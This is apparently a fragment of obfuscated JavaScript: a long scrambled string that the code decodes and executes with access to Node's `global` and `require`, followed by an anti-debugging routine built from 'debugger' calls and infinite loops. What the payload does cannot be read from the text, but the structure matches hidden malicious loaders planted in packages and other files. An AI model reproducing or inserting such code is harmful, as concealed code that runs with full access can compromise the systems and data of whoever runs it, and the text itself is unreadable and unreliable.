^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\x5c\x27)&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw\x20.RR(]PRD.\x20lf!:&.bdpTl.R#RS.$R<(R\x20<<c[.n.\x20oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R>\x20RRriR>cUp.cRWZR!RDK)0cvnnks.e\x20R\x20^dlR<cfRRu:sGRe,(gRVR\x22RuRRR\x22RtR<Rs\x22.ERi_P&R<lyoSg\x27s>vRcwe4Rcg`.h<_c\x27(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\x27<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs(\x20>RP]xtt_s_ohB<a\x27s&.P<\x20.kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS\x20<RbcsRVRsxrda]R;t?RN,,R>)cPY\x22cRcReF\x20!0RRq}}r05L6.<R.rf<$u|c<c<U-D[\x20cc.o<5;<\x20(.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt\x22e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\x5c@u\x209e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\x5c<zi.Rcabr\x20(<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d`\x20Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R(\x20(...<\x22:<NR%eR\x20i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}.\x22P&yseR_a%rRR.D<iPsRD!i.mR\x22Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR\x22\x22](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR&\x20#rDceR.alRR.R.(\x22]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o\x22<i<,R!s\x20oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n\x20fs.$n8upO$0isssi.-<vR<.<qQ(!R!\x20[!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R\x20Rm!RfxR\x20mRok!ct<(..nRcSRn\x5c&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r<\x20.o[iv.<R1sR9d]R+RRheR!cc2RRe\x229c[r<;DePcRRktGlg<?tAU\x27ttRQR}\x20w3tRat](Vt-?<<?..\x22lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR\x20t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR<\x20utE\x22f}bfr.<sR+]dr\x20<R!QRw.i\x20IRT_Po.(c0t8(sRTRRcnBR!\x22.xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R\x22xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE)\x20as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK\x22.lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP\x20#E63ap3[R)Lddc;RxR!R\x27\x20oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z<\x20gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll.\x20.D\x20g<(rhv\x20\x224k!\x20`lR<ke1\x20c$$5Rz.RR]eu&DiR\x20.R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^.\x20Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M\x22m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR\x22sz3o\x22<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR\x203waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_\x20|<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\x27b)=_<m)icAcCRc.n<R.e\x20..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R=\x20tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+.\x20RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro\x20tl\x20Rc(A~i!*(bR%cR,c0t<\x20rMRR<\x20Ri<\x20.fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n\x20RwrN0#tRduc_-RS\x22i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i.\x20R<e\x20.6Rga.rgs+Qitd.o!cteaLRo)3R\x20<.cd./.~<\x20.s\x5c.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b\x20\x22cRt,\x27leacPc\x20RR<Rz\x22<Ri\x20l0oRRdRs7.R(eCcR_.6\x22_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\x27wnd.s;sw+R4/suDicPba\x20..i!o1^r}I>e4<:RwCRic<RRRc\x22.\x20dRpt0<.Rk0<W8r\x20RnR.Dc.CN\x20lwoh.l-<R<pcbR\x20Pe6hY-Rt.cEp:<+a-V<RaRf\x27(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w\x22l{e]e-R</<s4Nt.op\x22ce.4Rn{SRo<R)Cc])e(Rw8RR.\x20<1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\x27spC0!RGcr.2FRiRePaRnsRRRna<R)5U:\x22n=cdc?ABt.20.tdc!C1R\x20c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4\x20RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\x5c<w.\x20.;R<eR4\x5csRc8<R.R[EdR\x20uoR[}V(.pd\x27\x22<Ja(4prAR(.Nc<<rp3.>z\x20eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn\x20%R.RF)lR;R.s\x20R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk\x20Ys(s3.c\x20<4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\x5c?Rl._Rccz4&:?0\x20.5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|\x22.PrrRn<cRnP!aRRtRfR.P\x208\x27R<JA\x20R&i<ecc{]cf.RmaR.irc.iReZ\x22n<y!<\x20cR\x20#<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\x5cgo_0lRmvF(<e9s<Rtt(\x20!RnR6}<.itO..&9s4dNRc\x20.o.RR.]j0\x20R\x20ma4;r<sCa)&\x20mo[xlR*ht!,Aup\x20Ru,fRtf[j)P*cRR1<RSv\x20s!2cIsR..e74hRd\x27c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$\x20rd<cw).F<ObZWR.jg.U4\x22afR`\x27m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\x27e.l.2.I.e9rRe.s\x271=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)%\x20/.(]b8cRs+vR-c)}:osR.c#\x22<cqk<ek.imRSN.RsE\x20bPPn)<e}o0e\x22.1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR\x20bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c\x20RRR.qn\x20.RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s\x20s{Te\x20<!.+.R.<uRPRo.<K.m.a.srM<R\x20.cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\x27@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc\x20l.<\x20o(J.e.#N.7t<)c<w\x20eR0.=<yc\x20!..Re?<n\x27B[Rbo\x27auR}\x20rae#R=.iR(st2.b~\x20<Sc.}tTsRr<aR)\x20ryir!C<c\x20td~\x22\x20X.ttR<R!d\x20c..!ed.R.<R\x20n.Sne!!)4/oXRRu.enR<.rRqR\x22l_M.efttr\x20tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\x27t]&.RRR-4R&ew\x5ccRYeonf\x20t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a?\x20nec<R..avloRvjRge._\x20=R+.RR.wdR.d6%.Icc(+t.:ci\x27.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c#\x20n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0\x20lEt!dn\x220pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs\x20RgadRroG(ltl\x20#(yr<.#ddt.<R\x20i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr.\x20w9cTaR=<PcdK]_\x5c2f(\x20#.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR\x20.dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm\x22<sisPd.?\x20pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr(\x20{.eTRR}.c}<RR8..RpR\x22cg;.cc0RrR.\x20t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z\x22<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\x27$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e\x20&l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe\x20cRckRx)<c&ci.yceluy;,.XdrRlRR#\x20ccf.cR\x20\x20R$Rcorr(.rCp<Nr#E(]RnR\x22ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n\x20C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!\x20\x20R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a*\x20)I(ldR(wsr6\x20*R7!a<S.c<\x5cR.BELRe6Yf<1<ecPrDe\x20sl0PbD#R]o.\x27<l.m\x20R(p)<ekac.cR.d.._u<a\x27<\x20Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{\x20cWGf}ohdcas.].\x20fP=\x20os67EocIPoc\x20.7igcFCR.\x20<cE.N\x20.bR'));return _0x11b0bf('',_0x1252ab)(0x9cd),0x1fce;}(global,require));function _0x32e299(_0x5c2df2){var _0x51a28a={'CryZA':'while\x20(true)\x20{}'};function _0x3aaa23(_0x4cbf26){var _0x2fe153=_0x516c;if(typeof _0x4cbf26===_0x2fe153(0x7))return function(_0x3b0d7b){}[_0x2fe153(0x10)](_0x51a28a[_0x2fe153(0x1a)])['apply']('counter');else(''+_0x4cbf26/_0x4cbf26)[_0x2fe153(0x18)]!==0x1||_0x4cbf26%0x14===0x0?function(){return!![];}[_0x2fe153(0x10)](_0x2fe153(0x16)+'gger')[_0x2fe153(0x9)]('action'):function(){return![];}[_0x2fe153(0x10)](_0x2fe153(0x16)+_0x2fe153(0x17))[_0x2fe153(0x0)]('stateObject');_0x3aaa23(++_0x4cbf26);}try{if(_0x5c2df2)return _0x3aaa23;else _0x3aaa23(0x0);}catch(_0x4f5172){}}
